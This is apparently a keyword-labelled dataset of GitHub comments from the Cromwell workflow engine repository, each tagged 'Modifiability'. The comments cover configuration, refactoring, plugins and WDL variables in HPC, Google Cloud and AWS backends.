Modifiability,"In Cromwell versions 67 and earlier `virtual-private-cloud` configuration exclusively specifies Google project label keys, not literal values. The actual values are specified in labels on the Google project. For example with a VPC config like:. ```hocon; virtual-private-cloud {; network-label-key = ""my-network-label-key""; subnetwork-label-key = ""my-subnetwork-label-key""; auth = ""application-default""; }; ```. As seen in the [labels page in GCP console](https://console.cloud.google.com/iam-admin/labels), there should be project labels with key/values of `my-network-label-key`/`my-private-network` and `my-subnetwork-label-key`/`my-private-subnetwork`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843:60,config,configuration,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905062843,2,['config'],"['config', 'configuration']"
Modifiability,"In Google Compute Engine, one can create custom networks and even delete the default network.; Docs: https://cloud.google.com/vpc/docs/using-vpc; List of networks: https://console.cloud.google.com/networking/networks/list. The ability to specify a network where operations are created is supported in v2alpha1, but there is no place to specify it in Cromwell (which always uses the ""default"" network). AC: Add an option to Cromwell's global config where a user can specify the VPC network name, for the PAPI v2 backend. This would override the current ""default"" network used by Cromwell. Testing Criteria:; Confirm that Cromwell honors using a non-default network when specified via the config.; If the network name specified doesn't exist, the error returned to the user contains information about 1) a link to documentation on how to create a network and 2) how to confirm a network exists through the cloud console.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4005#issuecomment-414163462:441,config,config,441,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4005#issuecomment-414163462,2,['config'],['config']
Modifiability,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:716,Variab,Variable,716,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827,1,['Variab'],['Variable']
Modifiability,"In addition to the commit comments. Specifically for ""the docker"":; - InputParameters weren't wired in for secondary files. Now they are, with Polys and a bit of borrowing from the OutputParameters. The common code was refactored into FileParameter.; - CWL spec says InputArraySchema's can't have secondary files, and that they should be specified on the InputBinding. The CWL via ""the docker"" wants them on the IAS anyway. The IAS secondary files are now wired in through a Poly.; - ""The docker"" was using strings like `$(""foo"")/$(""bar"")` that was tripping up our various expression regex patterns. This PR replaces them with the (latest as of Friday) copy-port of cwltool's state machine. The state machine works on _any_ string, even those without `""$(""`. But the spec for secondary files says that only expressions should be returned-as-rendered, while plain strings should be instead appended instead of used as literals. It turns out this discrimination is done in cwltool `""$("" in expr` (see numerous links in the scala comments). So the presence of `""$(""` is now used for our `ECMAScriptExpression` to similarly guess if a string is a interpolated string or a regular string. `ECMAScriptExpression` and `InterpolatedString` were pretty much the same thing and were merged back together. There was also a bit of code where if a malicious (or errant) CWL was submitted a `java.lang.Error` would be thrown possibly exiting the JVM. The code around this section was refactored to use a compile-time-checked Poly instead of hope-we-got-them-all pattern matching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370296979:219,refactor,refactored,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370296979,2,['refactor'],['refactored']
Modifiability,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:233,config,configuration,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288,5,"['Config', 'config']","['Configuring', 'config', 'configuration']"
Modifiability,"In case someone is looking to acheive this: The ~wdl task that runs as part of configuration has access to 'job_name'. I have passed this through as an environment variable. . ```; submit-docker = """"""; docker run \; --entrypoint ${job_shell} \; -e CROMWELL_JOB_NAME=${job_name} \; ```. Side note it would be nice if the variables available to that conf script were documented - I am reverse engineering from the example configs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721:79,config,configuration,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721,4,"['config', 'variab']","['configs', 'configuration', 'variable', 'variables']"
Modifiability,In light of the Great Database Refactoring this is not gonna happen,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/848#issuecomment-236285934:31,Refactor,Refactoring,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/848#issuecomment-236285934,1,['Refactor'],['Refactoring']
Modifiability,"In order to fix the coverage I am willing to write tests. But I need some explanation on how to configure the cromwell that is used by centaur, so I can set `exit-code-timeout-seconds`. Can somebody give me that? Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749:96,config,configure,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749,1,['config'],['configure']
Modifiability,"In other words, I'm looking for the *default* configuration of Cromwell to *never* run `isAlive` (except on server restarts, like today). A user should have to deliberately change their configuration to make it happen.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424373365:46,config,configuration,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424373365,2,['config'],['configuration']
Modifiability,"In particular, the summarizer that uploads metadata to GCS should have a really high value configurable!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5087#issuecomment-514434249:91,config,configurable,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5087#issuecomment-514434249,1,['config'],['configurable']
Modifiability,"In the [README](https://github.com/broadinstitute/cromwell/blob/25/README.md#sun-gridengine-backend), it's buried and could be clearer, but it says:. > There are two special runtime attribute configurations, cpu, and memory_\<unit\>.; > …; > When the runtime attribute configuration Int memory_\<unit\> or Float memory_\<unit\> is specified, it is provided to submit by the runtime attribute in WDL memory. (slightly better formatting in the README). There's more ""what"" in the README, but the ""why"" extends from the fact that JES, TES, and other backends all use a common `memory` runtime attribute. Using this common runtime attribute name, `memory`, increases the chance that a WDL will be runnable on a different backends. In a WDL run on standard backends, `memory` is specified as a WDL string, parsed by the backends into a [`MemorySize`](https://github.com/broadinstitute/cromwell/blob/25/backend/src/main/scala/cromwell/backend/MemorySize.scala#L39). However, the Config backend used for SLURM, SGE, Local, etc., needs to covert the `MemorySize` back into a string, for embedding into the custom `submit` string. The `_<unit>` in `memory_<unit>` is how the `MemoryUnit` gets converted into a string. Say someone defines a WDL originally intended to run on the JES backend, containing a task with `memory: ""2 GB""`. If instead, this same WDL will be run on a Config backend, and the config specifies `Int memory_mb`, the string value of `memory_mb` passed into `submit` will expand to `2000`. Let us know if you have more questions and/or suggestions, or if this resolves this particular issue for now?. **TL;DR memory_\<unit\> is one of the reserved runtime-attribute names, meant to make WDLs more portable.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2068#issuecomment-287266090:192,config,configurations,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2068#issuecomment-287266090,7,"['Config', 'config', 'extend', 'portab']","['Config', 'config', 'configuration', 'configurations', 'extends', 'portable']"
Modifiability,In the runtime attributes in the config file or each of the tasks?. I added it to the config and it did the same thing. Does having a Local provider use Docker by default?. Thanks for your help!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694534461:33,config,config,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694534461,2,['config'],['config']
Modifiability,"In your cromwell AWS config file, check that you have set the region correctly (and not to ""default"", but to something explicit like `us-east-1`).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016530:21,config,config,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016530,1,['config'],['config']
Modifiability,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:378,config,config,378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153,1,['config'],['config']
Modifiability,"Initial support landed. Ref 1689e81 and ff89630. Some failing tests commented out. In order to pass these tests, S3Path (which should probably be broken out into another file) needs to implement the Path trait directly rather than inheriting from Path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-375820432:231,inherit,inheriting,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-375820432,1,['inherit'],['inheriting']
Modifiability,IntelliJ has a Markdown plugin that gives you a preview FWIW,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3741#issuecomment-395449356:24,plugin,plugin,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3741#issuecomment-395449356,1,['plugin'],['plugin']
Modifiability,Interesting... because my new-world config does not have a value for system.workflow-restart and it works fine,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224689981:36,config,config,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224689981,1,['config'],['config']
Modifiability,Is call-cache unavailable if you use the Singularity image file?. Is there a solution? How do I configure it?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094:96,config,configure,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094,1,['config'],['configure']
Modifiability,Is it possible to configure shell path? e.g. to `/bin/sh`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2593#issuecomment-562507565:18,config,configure,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2593#issuecomment-562507565,1,['config'],['configure']
Modifiability,Is the config change worth a changelog/readme comment?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-304015691:7,config,config,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-304015691,1,['config'],['config']
Modifiability,"Is the cromwell.examples.conf biased to not include full examples for its clients? Having lots of experience reading documentation vs. getting code, my general preference is to find a complete config, copy paste, and customize it. Pointing the user to the docs is okay as long as the full configuration is there (not broken into sections.). On the other hand, I agree it's bad to confuse the user with too many options. My preference would be for consistency. If you have the examples file, you should provide all examples there, as this would be the expectation. If you decide to link to docs, this should be standard for other types, as the two could get disconnected (i.e. different versions across locations).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468832014:193,config,config,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468832014,2,['config'],"['config', 'configuration']"
Modifiability,"Is there an example of how to set call caching to true and allowResultReuse to true in the `-o options` file when running a workflow. I am looking for examples and the documentation and I just keep guessing. Both ways of setting outside of `callCaching` and inside still have my `-m metadata` file showing below:; ```. ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. options.json file:; ```; {; 	""default_runtime_attributes"": {; 		""write_to_cache"": true,; 		""read_from_cache"": true,; 		""system.file-hash-cache"": true,; 		""allowResultReuse"" : true,; 		""callCaching"": {; 			""hit"": false,; 			""effectiveCallCachingMode"": ""ReadAndWriteCache"",; 			""result"": ""Cache Miss"",; 			""allowResultReuse"": true; 		}; 	}; }; ```. EDIT:; This only worked by creating a config file with lines:; ```; call-caching {; enabled = true; }; ```; If this is required, shouldn't this documentation [page](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/) include that information under section ""Call Caching Options""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913:805,config,config,805,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913,1,['config'],['config']
Modifiability,Is this path so mutable that it needs to be a config option? I.e. `circe` can't be used?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4122#issuecomment-423302745:46,config,config,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4122#issuecomment-423302745,1,['config'],['config']
Modifiability,"Is this valid WDL from mutect2.wdl line [982](https://github.com/broadinstitute/gatk/blob/4.2.0.0/scripts/mutect2_wdl/mutect2.wdl#L982)?; `String filter_funcotations_args = if defined(filter_funcotations) && (filter_funcotations) then "" --remove-filtered-variants "" else """"`. Visual Studio plugin seems to complain with `optional Boolean? operand to &&` probably because in the task `filter_funcotations` is optional. Just wondering???",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3384#issuecomment-888789768:290,plugin,plugin,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3384#issuecomment-888789768,1,['plugin'],['plugin']
Modifiability,"Isn't the `runtime` section supposed to be backend/engine specific? Maybe this discussion belongs more in the openWDL board, but having a section that is simply defined as key-value pairs that allows expressions, the implementation of which is at least partially engine specific (as an engine may implement for multiple backends) makes a lot of sense to me. While there are plenty of key-values that are easily generalized, and can be fixed for such a section, backends almost invariably have specialized specific options that are best controlled on the fly rather than via fixed configs. As an analogy, The DRMAA API allowed for this with SGE and similar run-execution engines, by generalizing common functions, and allowing pass-through of specific ones (e.g. soft memory limits, if my vague memory serves).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349335796:580,config,configs,580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349335796,1,['config'],['configs']
Modifiability,"It could, I sort-of don't like the idea of encouraging non-portable workflows by allowing users to make the read-length higher in config files without making that explicit in the CWL",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2771#issuecomment-338325747:59,portab,portable,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2771#issuecomment-338325747,2,"['config', 'portab']","['config', 'portable']"
Modifiability,"It does not seem likely in the foreseeable future, I don't think Cromwell is looking to expand the scope of the local and/or config backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1406650763:125,config,config,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1406650763,1,['config'],['config']
Modifiability,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:272,plugin,plugin,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833,1,['plugin'],['plugin']
Modifiability,It looks like our Docker SBT plugin recently added support for the required `buildx` command. https://github.com/marcuslonnberg/sbt-docker/pull/131,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496315700:29,plugin,plugin,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496315700,1,['plugin'],['plugin']
Modifiability,"It looks like that class defines all of the possible variations, but doesn't actually choose one for you. That must happen somewhere in code that reads a config and instantiates the appropriate variation. I think the most likely source of the issue is config parsing specific to the backend, or a bad config itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806:154,config,config,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806,3,['config'],['config']
Modifiability,"It seems to me very cumbersome to ask users to think this through. Currently my WDLs have a variable:; ```; String docker_registry = ""us.gcr.io""; ```; But I have dockers uploaded on each of `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io`. The main issue is that the user has to take initiative to fill that variable with the correct GCR. It would be great if there was some sort of environmental variable that could let the WDL know which docker registry is the closest (and which one has no egress charges).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358:92,variab,variable,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358,3,['variab'],['variable']
Modifiability,"It should be declared in the conf file as follows (see the ""root"" tag). ```; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; **root = ""s3://my-cromwell-bucket-name/cromwell-execution""**; ...; ```. I recommend using the cloud formation template detailed in this page, it will set it all up for you. https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5226#issuecomment-602846091:217,config,config,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5226#issuecomment-602846091,1,['config'],['config']
Modifiability,"It shouldn't be too involved - there's an example of backend configuration being used in the same file you're updating [here](https://github.com/broadinstitute/cromwell/blob/develop/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L132), which means it could be a per-backend option (see where the value could be set within a backend config [here](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf#L379)). . Does that give you what you needed?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-548064730:61,config,configuration,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-548064730,2,['config'],"['config', 'configuration']"
Modifiability,"It will take me a while to dig up an online reference (googling java thread safety returns a ton of results to sort through). But creating one's own private lock is an extra level of paranoia, kind of like marking all java variables as `final`, or reducing the scope of classes to `private`. If one uses `this` as a mutex, then others can actually steal your lock, by locking **you**. ```scala; object LiquibaseUtils {; def echoQuick = {; this.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // I have your lock!; Thread.sleep(1.day.toMillis); }; }; ```. If however the synchronization is done on a private variable, it can never be shared by outside participants. ```scala; object LiquibaseUtils {; private val cantTouchThis = new Object; def echoQuick = {; cantTouchThis.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // Doesn't affect echoQuick; Thread.sleep(1.day.toMillis); }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381:223,variab,variables,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381,2,['variab'],"['variable', 'variables']"
Modifiability,"It would be nice to have some more documentation about this. When I first logged in this morning, I couldn't access the board, so I tried creating an account and that also failed initially for an _unexpected error, please try again later_ sort of thing. . Also, what board do we create Cromwell issues under? My best guess is `Jira Support` and that's where I created my issue: [Cromwell (server) loses ability to poll some workflows](https://broadworkbench.atlassian.net/browse/JS-34), but all of the other issues aren't really Cromwell related. A ""query"" field might also be useful. . These are the boards currently on Jira:; - `Batch Analysis`; - `Cloud Accounts`; - `Data-repo`; - `DevOps`; - `DSP-ELT Backlog`; - `Interactive Analysis`; - `Jira Support`; - `New Project`; - `PERF`; - `PRODUCTION`; - `QA`; - `SAND-NG`; - `SANDBOX`; - `SUPPORT`; - `TERRA ROADMAP`; - `TerraUI`; - `User Metrics`; - `UX`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778:827,SANDBOX,SANDBOX,827,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778,1,['SANDBOX'],['SANDBOX']
Modifiability,It would have to be added to Cromwell itself. There's nothing in the config or in the WDL language that could solve this,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436473404:69,config,config,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436473404,1,['config'],['config']
Modifiability,"It's a bit confusing, you've posted the error log from a stage called `CollectSequencingArtifactMetrics`, but posted the WDL for a task called `FilterByOrientationBias`. Could you please send the WDL for the same task that's failing?. A case where this bug can happen is when you do doing string manipulation with `File` type variables. For example, if you `sub()` a `File` object to generate a new filename, it will use the S3 URL, as the input to `sub`. However, by the S3 URL, when interpreted by Bash as a path, doesn't exist on the right disk. I wrote an issue about it [here](https://github.com/openwdl/wdl/issues/260). Tell me if it's this same issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-436311106:326,variab,variables,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-436311106,1,['variab'],['variables']
Modifiability,"It's unclear how your environment is set up:. 1. You're using Cromwell to schedule jobs to GoogleCloud.; 2. You're Cromwell on a Google cloud instance and not scheduling any jobs out. ## Cromwell scheduling to GCloud. - Cromwell runs out of memory and dies; - Your task is running out of memory, this would cause your workflow to fail. . ### Cromwell OOM. Use MySQL and connect it to Cromwell: https://cromwell.readthedocs.io/en/stable/Configuring/#database. Cromwell + MySQL uses less memory and you get durability:. ### Task. It seems that your task is running out of memory, and not Cromwell. . I'll direct you towards the WDL spec: https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#memory. But basically, within your task you need to place the block or with more memory. ```; task mytask {; ...other stuff; runtime {; memory: ""2GB""; }; ```. ## Running Cromwell on a GC instance. Restart your instance with more memory.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-572850228:436,Config,Configuring,436,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-572850228,1,['Config'],['Configuring']
Modifiability,"It's worth a try. I've found that big (for a relatively modest ""big"") scatters of file paths end up chewing a lot of memory. In particular if you're globbing at all there are definitely some single threaded choke points (which is fine in a system running a ton of WFs, not so good if you're the only one) around the processing of those files. For both you and @meganshand it's worth trying upgrading to develop and making sure to include `rewriteBatchedStatements=true` to your JDBC URL. I think this only helps on MySQL however, I remember having reason to believe it didn't do anything on HSQL but I didn't try it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276768648:439,rewrite,rewriteBatchedStatements,439,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276768648,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,"JobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }; ```; Thanks for any tips or pointers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:4312,config,configuration,4312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,4,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config', 'configuration']"
Modifiability,"Just as a safety measure, maybe we should consider add a config option called something like ""allowCrossFSLocalisation"" - just to avoid accidentally downloading a 500GB file from GCS and the costs involved?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494:57,config,config,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494,1,['config'],['config']
Modifiability,"Just noticed, this PR uses different hashes for conformance tests for Local / PapiV1 / PapiV2. I'm assuming that was not intentional. I have an incoming PR (as soon as PRs quiet down + I get travis to pass for once) that refactors this into reusable includes. That will hopefully help making CI changes in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660:221,refactor,refactors,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660,1,['refactor'],['refactors']
Modifiability,Just thinking out loud - there seems to be a lot of duplication between this backend and the configurable shared-filesystem backend. ; I don't know whether you've tried expressing this as a configuration file backend?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1403#issuecomment-246796358:93,config,configurable,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1403#issuecomment-246796358,2,['config'],"['configurable', 'configuration']"
